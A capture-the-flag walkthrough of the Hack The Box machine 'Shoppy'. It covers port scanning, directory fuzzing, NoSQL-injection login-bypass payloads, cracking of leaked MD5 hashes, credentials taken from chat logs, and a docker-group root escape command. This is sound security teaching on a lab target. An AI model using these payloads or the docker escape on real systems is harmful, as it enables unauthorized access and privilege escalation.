Hello and welcome back to another write up. This one will be for box Shoppy from Hackthebox. 

We will start with nmap scan. 

```
# cat nmap                                                                                                                                                                                                                           
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 19:16 EST
Nmap scan report for 10.10.11.180 (10.10.11.180)
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
```

We see ports 22 80 and 9093 opened and hostname.


Now let's add shoppy.htb to our hosts file and visit the page:

```
echo "10.10.11.180 shoppy.htb" >> /etc/hosts
```

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG1.png?raw=true)

There's nothing interesting on the page. Time to fuzz web directories for this I used ffuf:

```
# ffuf -u http://shoppy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 77ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 77ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 77ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 114ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 129ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 64ms]
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 100ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 75ms]
```

Trying to access anything returns `Cannot GET`. With little usage of google we now know it is node.js application.

Now we visit login found with ffuf. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG2.png?raw=true)

I'll try to use sql injection to bypass the login page. Searching for which database nodejs uses the most I found out
that it is nosql most often mongodb. To look for paylaods I'll grab some from here: https://book.hacktricks.xyz/pentesting-web/nosql-injection.
These look promising:

```
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

But these don't lead anywhere. After trying other I stumbled upon this site: https://nullsweep.com/nosql-injection-cheatsheet/.

And this payload finally works:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG3.png?raw=true)

And we get to some admin panel. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG4.png?raw=true)

And we have ability to search for users and it gives us they're password. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG5.png?raw=true)

Using the same payload as before but without the comment we get json with two users jaeger and admin. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG6.png?raw=true) 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Shoppy/images/IMG7.png?raw=true)

The hashes returned look as basic md5 hash. Using crackstation we get password for user josh:remembermethisway

I'll tried to use it to login with ssh but no luck. Remembering port 9093 is some log file which isn't useful either.
Now trying to enumerate subdomains with ffuf again. 

```
```

It found subdomain mattermost. Visiting that gives us mattermost login page. Login with credentials found previously works. 
It's first time I see mattermost but it looks simirarly to rocket.chat which is app for chatting. 

Looking through chats we see one with jaeger where are ssh credentials found:

```
Hey @josh,

For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
```

And they work and we get user flag.

```
jaeger@shoppy:~$ cat user.txt 
d298962e84019********************
```

Looking for ways to escalater our privileges I start with `sudo -l`

```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

```

The password-manager is 64 bit executable file:

```
jaeger@shoppy:~$ file /home/deploy/password-manager
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
```

Using this file looks like this:

```
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: pass
Access denied! This incident will be reported !
```

Let's try to find the password with strings. The basic version doesn't work but with different encoding it returns this:

```
jaeger@shoppy:/home/deploy$ strings -e b /home/deploy/password-manager 
Sample
```

And we have creds! 

```
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Logging with ssh and using command id we see we are in group docker:

```
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

This can be used for privilege escalation. Looking at trusty gtfobins gives us this(https://gtfobins.github.io/gtfobins/docker/):

```
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd root
# ls
root.txt
# cat root.txt
0de991d085a7c94da107b*****************
```

This ends the box. Thanks for reading this write up u can message me on twitter https://twitter.com/Vojtech1337 and until next time!
